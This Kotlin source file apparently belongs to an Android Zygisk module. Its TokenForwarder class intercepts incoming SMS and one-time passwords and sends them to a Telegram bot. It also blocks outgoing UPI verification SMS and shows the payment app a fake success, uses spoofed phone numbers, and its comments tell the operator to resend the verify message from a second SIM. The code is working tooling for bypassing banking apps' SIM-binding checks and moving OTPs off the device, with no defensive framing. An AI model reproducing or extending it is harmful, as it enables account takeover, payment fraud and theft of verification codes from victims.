package com.hivirtus.zygiskmode

import android.content.Context
import android.os.Build
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(
    private val configManager: ConfigManager,
    private val context: Context? = null
) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        val creds = resolveTelegramCreds()
        if (creds.first.isBlank() || creds.second.isBlank()) return false

        val config = configManager.load()
        if (!config.autoForwardToken && !otp.direction.equals("outgoing", ignoreCase = true)) return false

        val peer = otp.rawPeer.ifBlank { otp.sender }
        val body = otp.body.ifBlank { otp.otp }
        if (!config.autoForwardToken &&
            !SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)
        ) {
            return false
        }

        val message = buildInterceptMessage(otp, config)
        val sent = postTelegram(creds.first, creds.second, message)
        if (sent) {
            context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
        }
        return sent
    }

    /** Outgoing verify SMS — Telegram hamesha bhejo jab creds hon. */
    fun forwardOutgoingBlocked(otp: LastOtp): Boolean {
        val creds = resolveTelegramCreds()
        if (creds.first.isBlank() || creds.second.isBlank()) return false
        val config = configManager.load()
        val message = buildInterceptMessage(otp, config)
        val sent = postTelegram(creds.first, creds.second, message)
        if (sent) {
            context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
        }
        return sent
    }

    private fun resolveTelegramCreds(): Pair<String, String> {
        val config = configManager.load()
        val stored = context?.let { TelegramCredentialStore.load(it) }
        val token = stored?.botToken?.ifBlank { null } ?: config.telegramBotToken
        val chat = stored?.chatId?.ifBlank { null } ?: config.telegramChatId
        return token to chat
    }

    fun sendForwardingTest(botToken: String, chatId: String): Boolean {
        return sendTestMessage(botToken, chatId, buildForwardingTestMessage())
    }

    fun buildForwardingTestMessage(): String {
        return buildString {
            appendLine("🚀 $TELEGRAM_HANDLE Telegram Forwarding Test Successful!")
            appendLine()
            append("Device: ").append(deviceName())
        }
    }

    private fun smsCopyText(otp: LastOtp): String {
        return otp.body.ifBlank { otp.otp }.trim()
    }

    private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
        val outgoing = otp.direction.equals("outgoing", ignoreCase = true)
        val peerLabel = if (outgoing) "To (short code)" else "From"
        val peerValue = if (outgoing) {
            otp.rawPeer.ifBlank { resolveUpiVerifyNumber(otp, config) }
        } else {
            otp.sender.ifBlank { otp.rawPeer }
        }
        val smsBody = smsCopyText(otp)
        val appLabel = resolveAppLabel(otp)
        val sendFrom = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }

        return buildString {
            appendLine(if (outgoing) "📱 Verify SMS Blocked — Fake Success ✅" else "📱 Intercepted Incoming SMS")
            appendLine(TELEGRAM_HANDLE)
            if (outgoing) {
                appendLine()
                appendLine("Real SIM: blocked · App ko success dikha")
            }
            if (appLabel.isNotBlank()) {
                appendLine()
                appendLine("App: $appLabel")
            }
            appendLine()
            appendLine("$peerLabel (Tap to copy):")
            appendLine("<code>${escapeHtml(peerValue)}</code>")
            appendLine()
            appendLine("Body / Token (Tap to copy):")
            append("<code>${escapeHtml(smsBody)}</code>")
            if (outgoing && sendFrom.isNotBlank()) {
                appendLine()
                appendLine()
                appendLine("Send FROM (app login number / 2nd SIM):")
                appendLine("<code>${escapeHtml(sendFrom)}</code>")
                appendLine()
                append("Messages se isi number wali SIM se manually bhejo ↑")
            }
        }
    }

    private fun resolveAppLabel(otp: LastOtp): String {
        if (otp.messageLabel.isNotBlank()) return otp.messageLabel
        val pkg = ActiveHookManager.readActivePackage()
        if (!pkg.isNullOrBlank()) return UpiAppRegistry.displayNameFor(pkg)
        return ""
    }

    private fun deviceName(): String {
        val model = Build.MODEL?.trim().orEmpty()
        return model.ifBlank { "Android" }
    }

    /**
     * UPI verify short code / destination — personal mock number hide.
     */
    private fun resolveUpiVerifyNumber(otp: LastOtp, config: ModuleConfig): String {
        val rawPeer = otp.rawPeer.trim()
        if (rawPeer.isNotBlank() && !isSpoofOrPersonalNumber(rawPeer, config)) {
            return rawPeer
        }

        val sender = otp.sender.trim()
        val injectId = SmsMatcher.userSenderId(config)?.trim().orEmpty()
        if (sender.isNotBlank() && !isSpoofOrPersonalNumber(sender, config)) {
            if (sender != injectId || !SmsMatcher.isIndianMobileNumber(sender)) {
                return sender
            }
        }

        extractVerifyNumberFromBody(otp.body.ifBlank { otp.otp })?.let { return it }

        return rawPeer.ifBlank { sender }.ifBlank { "UPI-VERIFY" }
    }

    private fun isSpoofOrPersonalNumber(value: String, config: ModuleConfig): Boolean {
        val digits = normalizeDigits(value)
        if (digits.isBlank()) return false

        val blocked = personalNumberDigits(config).filter { it.isNotBlank() }

        return blocked.any { blockedDigits ->
            digits == blockedDigits ||
                (digits.length == 10 && blockedDigits.endsWith(digits)) ||
                (blockedDigits.length == 10 && digits.endsWith(blockedDigits))
        }
    }

    private fun personalNumberDigits(config: ModuleConfig): Set<String> = buildSet {
        add(normalizeDigits(configManager.readSpoofPhone()))
        add(normalizeDigits(config.mockPhoneSim1))
        add(normalizeDigits(config.mockPhoneSim2))
        add(normalizeDigits(config.injectSenderId))
    }

    private fun normalizeDigits(value: String): String =
        value.replace(Regex("[^0-9]"), "")

    private fun extractVerifyNumberFromBody(body: String): String? {
        if (body.isBlank()) return null
        Regex("""(?<!\d)(91\d{10}|\d{10}|\d{6,12})(?!\d)""").findAll(body).forEach { match ->
            val candidate = match.groupValues[1]
            val config = configManager.load()
            if (!isSpoofOrPersonalNumber(candidate, config)) return candidate
        }
        return null
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    fun sendTestMessage(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("parse_mode", "HTML")
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean =
        sendTestMessage(botToken, chatId, text)

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    companion object {
        const val TELEGRAM_HANDLE = "@hivirtus @liqdy"
    }
}
